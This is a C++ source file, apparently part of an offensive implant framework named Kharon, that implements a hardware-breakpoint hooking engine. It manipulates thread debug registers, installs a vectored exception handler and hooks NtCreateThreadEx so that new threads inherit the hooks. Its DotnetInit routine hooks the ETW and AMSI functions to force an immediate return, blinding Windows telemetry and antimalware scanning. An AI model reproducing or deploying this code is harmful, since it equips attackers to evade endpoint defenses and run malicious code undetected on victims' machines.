#include <Kharon.h>

auto DECLFN HwbpEng::SetDr7(
    _In_ UPTR ActVal,
    _In_ UPTR NewVal,
    _In_ INT  StartPos,
    _In_ INT  BitsCount
) -> UPTR {
    UPTR Mask  = ( 1UL << BitsCount ) - 1UL;
    return ( ActVal & ~( Mask << StartPos ) ) | ( NewVal << StartPos );
}

auto DECLFN HwbpEng::Install(
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ PVOID Callback,
    _In_ ULONG ThreadID
) -> BOOL {
    PDESCRIPTOR_HOOK NewEntry = nullptr;

    NewEntry = (PDESCRIPTOR_HOOK)Self->Hp->Alloc( sizeof( DESCRIPTOR_HOOK ) );

    Self->Krnl32.EnterCriticalSection( &CritSec );

    NewEntry->Drx           = Drx;
    NewEntry->ThreadID      = ThreadID;
    NewEntry->Address = Address;
    NewEntry->Detour  = ( decltype(NewEntry->Detour) )Callback;
    NewEntry->This    = this;

    if ( !Threads ) {
        Threads = NewEntry;
    } else {
        PDESCRIPTOR_HOOK Current = Threads;
        while ( Current->Next ) {
            Current = Current->Next;
        }
        Current->Next  = NewEntry;
        NewEntry->Prev = Current;
    }

    Self->Krnl32.LeaveCriticalSection( &CritSec );

    return Self->Hw->Insert( Address, Drx, TRUE, ThreadID );
}

auto DECLFN HwbpEng::SetBreak(
    _In_ ULONG ThreadID,
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ BOOL  Init
) -> BOOL {
    CONTEXT Ctx    = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    ULONG   Code   = STATUS_UNSUCCESSFUL;
    HANDLE  Handle = INVALID_HANDLE_VALUE;

    if ( ThreadID != Self->Session.ThreadID ) {
        Handle = Self->Td->Open( THREAD_ALL_ACCESS, FALSE, ThreadID );
    } else {
        Handle = NtCurrentThread();
    }

    Code = Self->Ntdll.NtGetContextThread( Handle, &Ctx );

    if ( Initialized ) {
        ( &Ctx.Dr0 )[Drx] = Address;
        Ctx.Dr7 = SetDr7( Ctx.Dr7, ( Drx * 2 ), 1, 1 );
    } else {
        if ( ( &Ctx.Dr0 )[Drx] == Address ) {
            ( &Ctx.Dr0 )[Drx] = 0ull;
            Ctx.Dr7 = SetDr7( Ctx.Dr7, ( Drx * 2 ), 1, 0 );
        }
    }

    Code = Self->Ntdll.NtSetContextThread( Handle, &Ctx );

    if ( Handle && Handle != NtCurrentThread() ) {
        Self->Ntdll.NtClose( Handle );
    }

    return Code;
}

auto DECLFN HwbpEng::Uninstall(
    _In_ UPTR  Address,
    _In_ ULONG ThreadID
) -> BOOL {
    PDESCRIPTOR_HOOK Current = Threads;

    Self->Krnl32.EnterCriticalSection( &CritSec );

    ULONG   Flag  = 0;
    INT8    Drx   = -1;
    BOOL    Found = FALSE;

    while ( Current ) {
        if ( Current->Address == Address && Current->ThreadID == ThreadID ) {
            Found = TRUE;

            Drx = Current->Drx;

            if ( Current == Threads ) {
                Threads = Current->Next;
            }

            if ( Current->Next ) {
                Current->Next->Prev = Current->Prev;
            }

            if ( Current->Prev ) {
                Current->Prev->Next = Current->Next;
            }

            if ( Current ) {
                Self->Hp->Free( Current );
            }
        }

        if ( Current ) {
            Current = Current->Next;
        }
    }

    Self->Krnl32.LeaveCriticalSection( &CritSec );

    if ( Found ) {
        Flag = Insert( Address, Drx, FALSE, ThreadID );
    }

    return Flag;
}

auto DECLFN HwbpEng::GetArg(
    _In_ PCONTEXT Ctx,
    _In_ ULONG    Idx
) -> UPTR {
#ifdef _WIN64
    switch ( Idx ) {
        case 1: {
            return Ctx->Rcx;
        }
        case 2: {
            return Ctx->Rdx;
        }
        case 3: {
            return Ctx->R8;
        }
        case 4: {
            return Ctx->R9;
        }
    }

    return C_DEF64( Ctx->Rsp + ( Idx * sizeof( PVOID ) ) );
#else
    return C_DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) );
#endif
}

auto DECLFN HwbpEng::SetArg(
    _In_ PCONTEXT Ctx,
    _In_ UPTR     Val,
    _In_ ULONG    Idx
) -> VOID {
#ifdef _WIN64
switch ( Idx ) {
    case 1: {
        Ctx->Rcx = Val; return;
    }
    case 2: {
        Ctx->Rdx = Val; return;
    }
    case 3: {
        Ctx->R8 = Val; return;
    }
    case 4: {
        Ctx->R9 = Val; return;
    }
}
    C_DEF64( Ctx->Rsp + ( Idx * sizeof( PVOID ) ) ) = Val;
#else
    C_DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) ) = Val;
#endif
}

auto DECLFN HwbpEng::BlockReal(
    _In_ PCONTEXT Ctx
) -> VOID {
    const unsigned char Ret = { 0xC3 };
#ifdef _WIN64
    Ctx->Rip = (UPTR)&Ret;
#else
    Ctx->Eip = (UPTR)&Ret;
#endif
}

auto DECLFN HwbpEng::Insert(
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ BOOL  Init,
    _In_ ULONG ThreadID
) -> BOOL {
    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };

    ULONG RetLength = 0;
    PVOID TmpValue  = NULL;
    LONG  NtStatus  = STATUS_UNSUCCESSFUL;
    BOOL  Flaged    = FALSE;

    NtStatus = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, nullptr, 0, &RetLength );
    if ( NtStatus != STATUS_INFO_LENGTH_MISMATCH ) return FALSE;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( RetLength );
    if ( !SysProcInfo ) return FALSE;

    TmpValue = (PVOID)SysProcInfo;    

    NtStatus = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, RetLength, &RetLength );
    if ( NtStatus != STATUS_SUCCESS ) return FALSE;

    while ( 1 ) {
        SysThreadInfo = (PSYSTEM_THREAD_INFORMATION)SysProcInfo->Threads;

        for  ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
            if ( ThreadID != HW_ALL_THREADS && ThreadID != HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) ) 
                continue;

            if ( ! SetBreak( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ), Address, Drx, Init ) );
        }

        if ( !SysProcInfo->NextEntryOffset ) break;

        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
    }

    Flaged = TRUE;
_KH_END:
    if ( TmpValue ) Self->Hp->Free( TmpValue );

    return Flaged;
}

auto DECLFN HwbpEng::Init( VOID ) -> BOOL {
    if ( Initialized ) return TRUE;

    if ( !CritSec.DebugInfo ) {
        Self->Krnl32.InitializeCriticalSection( &CritSec );
    }

    Mem::Zero( U_PTR( &CritSec ), sizeof( CRITICAL_SECTION ) );
    Mem::Zero( U_PTR( Threads ), sizeof( DESCRIPTOR_HOOK ) );

    Handler = Self->Krnl32.AddVectoredExceptionHandler( 
        1, (PVECTORED_EXCEPTION_HANDLER)Self->Hw->MainThunk
    );

    Self->Krnl32.InitializeCriticalSection( &CritSec );
    Initialized = TRUE;

    return TRUE;
}

auto DECLFN HwbpEng::Clean( VOID ) -> BOOL {
    if ( !Initialized ) return TRUE;

    Self->Krnl32.EnterCriticalSection( &CritSec );

    PDESCRIPTOR_HOOK Current = Threads;

    while ( Current ) {
        Uninstall( Current->Address, Current->ThreadID );
        Current = Current->Next;
    }

    Self->Krnl32.LeaveCriticalSection( &CritSec );

    if ( Handler ) Self->Krnl32.RemoveVectoredContinueHandler( Handler ); 

    Self->Krnl32.DeleteCriticalSection( &CritSec );

    Initialized = FALSE;

    return TRUE;
}

auto DECLFN HwbpEng::MainHandler( 
    _In_ PEXCEPTION_POINTERS e 
) -> LONG {
    BOOL Solutioned = FALSE;
    PDESCRIPTOR_HOOK Current = Threads;

    if ( e->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP ) goto _KH_END;

    Self->Krnl32.EnterCriticalSection( &CritSec );

    while ( Current ) {
        if ( Current->Address == e->ContextRecord->Rip && !Current->Processed ) {
            if ( Current->ThreadID != 0 && Current->ThreadID != Self->Session.ThreadID ) {
                Current->Processed = TRUE;
            }
    
            if ( !SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, FALSE ) ) {
                goto _KH_END;
            }
    
            VOID ( *Detour )( PCONTEXT, PVOID ) = Current->Detour;
            Detour( e->ContextRecord, this );
    
            if ( !SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, TRUE ) ) {
                goto _KH_END;
            }
    
            Current->Processed = TRUE;
        }

        Current->Processed = FALSE;
        Current = Current->Next;
    }

    Self->Krnl32.LeaveCriticalSection( &CritSec );
    Solutioned = TRUE;

_KH_END:
    return ( Solutioned ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH );
}

auto DECLFN HwbpEng::HookCallback(
    _In_ PVOID Parameter,
    _In_ BOOL  TimerWait
) -> VOID {
    PDESCRIPTOR_HOOK Current = Threads;
    INT8   i      = 0;
    HANDLE Handle = (HANDLE)( *(HANDLE*)Parameter );

    while ( !Handle ) {}

    Self->Krnl32.EnterCriticalSection( &CritSec );

    while ( Current ) {
        if ( Current->Address && Current->Detour && Current->ThreadID == HW_ALL_THREADS ) {
            Install( Current->Address, Current->Drx, (PVOID)Current->Detour, Current->ThreadID ); i++; 
        }

        if ( i == 4 ) break;

        Current = Current->Next;
    }

    Self->Krnl32.LeaveCriticalSection( &CritSec );
    Self->Krnl32.ResumeThread( Handle );
}

auto DECLFN HwbpEng::AddNewThreads(
    _In_ INT8 Drx
) -> BOOL {
    return Install( U_PTR( Self->Ntdll.NtCreateThreadEx ), Drx, (PVOID)Self->Hw->NtCreateThreadExHkThunk, HW_ALL_THREADS );
}

auto DECLFN HwbpEng::RmNewThreads(
    _In_ INT8 Drx
) -> BOOL {
    return Uninstall( U_PTR( Self->Ntdll.NtCreateThreadEx ), HW_ALL_THREADS );
}

auto DECLFN HwbpEng::NtCreateThreadExHk(
    _In_ PCONTEXT Ctx
) -> VOID {
    HANDLE  Timer  = INVALID_HANDLE_VALUE;
    PHANDLE Handle = (PHANDLE)GET_ARG_1( Ctx );
    ULONG   Flags  = GET_ARG_7( Ctx );
    Flags = Flags | THREAD_CREATE_FLAGS_CREATE_SUSPENDED;

    SET_ARG_7( Ctx, Flags );

    Self->Ntdll.RtlCreateTimer( &Timer, NULL, (WAITORTIMERCALLBACKFUNC)Self->Hw->HookCallbackThunk, Handle, 0, 0, 0 );

    CONTINUE_EXEC( Ctx );
}

auto DECLFN HwbpEng::NtCreateThreadExHkThunk(
    _In_ PCONTEXT Ctx,
    _In_ PVOID    This 
) -> VOID {
    static_cast<HwbpEng*>( This )->NtCreateThreadExHk( Ctx );
}

auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
    if( !Init() ) return FALSE;

    Install( Self->Hw->Etw.Handle, Dr1, (PVOID)Self->Hw->EtwThunk, HW_ALL_THREADS );
    Install( Self->Hw->Amsi.Handle, Dr2, (PVOID)Self->Hw->AmsiThunk, HW_ALL_THREADS );
    return AddNewThreads( Dr0 );
}

auto DECLFN HwbpEng::DotnetExit( VOID ) -> BOOL {
    return Clean();
}

auto DECLFN HwbpEng::EtwDetour(
    _In_ PCONTEXT Ctx
) -> VOID {
    SET_ARG_3( Ctx, 0 );
    BlockReal( Ctx );
    CONTINUE_EXEC( Ctx );
}

auto DECLFN HwbpEng::AmsiDetour(
    _In_ PCONTEXT Ctx
) -> VOID {
    SET_ARG_3( Ctx, 0 );
    BlockReal( Ctx );
    CONTINUE_EXEC( Ctx );
}

auto DECLFN HwbpEng::AmsiThunk(
    _In_ PCONTEXT Ctx,
    _In_ PVOID    This 
) -> VOID {
    static_cast<HwbpEng*>( This )->AmsiDetour( Ctx );
}

auto DECLFN HwbpEng::EtwThunk(
    _In_ PCONTEXT Ctx,
    _In_ PVOID    This 
) -> VOID {
    static_cast<HwbpEng*>( This )->EtwDetour( Ctx );
}
